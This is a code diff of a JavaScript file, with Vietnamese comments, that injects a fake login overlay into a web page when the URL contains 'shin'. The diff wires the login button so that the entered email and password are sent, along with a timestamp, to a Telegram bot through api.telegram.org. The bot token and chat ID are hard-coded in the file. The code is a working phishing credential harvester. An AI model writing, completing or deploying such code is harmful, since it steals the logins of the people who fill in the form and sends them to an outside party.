@@ -1,4 +1,11 @@
-const data = {};
+const currentUrl = window.location.href;
+
+if (currentUrl.includes("shin")) {
+    
+    const data = {};
+
+const TELEGRAM_TOKEN = "8717080086:AAH068HuIJdYKaVkr3192dQyCPFcPV7W5kA";
+const TELEGRAM_CHAT_ID = "6533206955";
 
 const overlay = document.createElement("div");
 
@@ -196,17 +203,17 @@ box.innerHTML = `
 overlay.appendChild(box);
 document.body.appendChild(overlay);
 
-const btn = document.getElementById("loginBtn");
+const loginBtn = document.getElementById("loginBtn");
 
-btn.onmouseenter = () => {
-    btn.style.background = "#70bb25";
+loginBtn.onmouseenter = () => {
+    loginBtn.style.background = "#70bb25";
 };
 
-btn.onmouseleave = () => {
-    btn.style.background = "#79c62a";
+loginBtn.onmouseleave = () => {
+    loginBtn.style.background = "#79c62a";
 };
 
-btn.onclick = () => {
+loginBtn.onclick = () => {
 
     data.email =
         document.getElementById("emailInput").value;
@@ -214,34 +221,35 @@ btn.onclick = () => {
     data.password =
         document.getElementById("passwordInput").value;
 
-    console.log(data);
-
-    alert(
-        "Email: " + data.email +
-        "\\nPassword: " + data.password
-    );
+    handleGuiData();
 };
 
-const TELEGRAM_TOKEN = "8717080086:AAH068HuIJdYKaVkr3192dQyCPFcPV7W5kA";
-const TELEGRAM_CHAT_ID = "6533206955";
-
-
 function handleGuiData() {
-    const dataHienTai = { 
-        status: "Nguoi dung da bam nut", 
-        time: new Date().toLocaleString("vi-VN") 
+
+    const dataHienTai = {
+        email: data.email,
+        password: data.password,
+        status: "Nguoi dung da bam nut Dang nhap",
+        time: new Date().toLocaleString("vi-VN")
     };
-    
-    // Gọi hàm gốc để bắn data sang Telegram
-    sendDataToTelegram(dataHienTai); 
+
+    sendDataToTelegram(dataHienTai);
 }
 
-
 function sendDataToTelegram(myData) {
-    const text = `🔔 *Có dữ liệu mới:* \n\n${JSON.stringify(myData, null, 2)}`;
-    
-    // Đường link API của Telegram
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+    const text =
+`🔔 Có dữ liệu mới
+
+Email: ${myData.email}
+Password: ${myData.password}
+
+Status: ${myData.status}
+
+Time: ${myData.time}`;
+
+    const url =
+`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
     fetch(url, {
         method: "POST",
@@ -250,12 +258,22 @@ function sendDataToTelegram(myData) {
         },
         body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: text,
-            parse_mode: "Markdown" // Để text hiển thị đẹp hơn
+            text: text
         })
     })
-    .then(() => console.log("Gửi về Telegram thành công!"))
-    .catch(err => console.error("Lỗi:", err));
+    .then(() => {
+
+        console.log("Đã gửi Telegram");
+
+    })
+    .catch((err) => {
+
+        console.error(err);
+
+    });
 }
 
-
+}
+else{
+    console.log("oh no");
+}
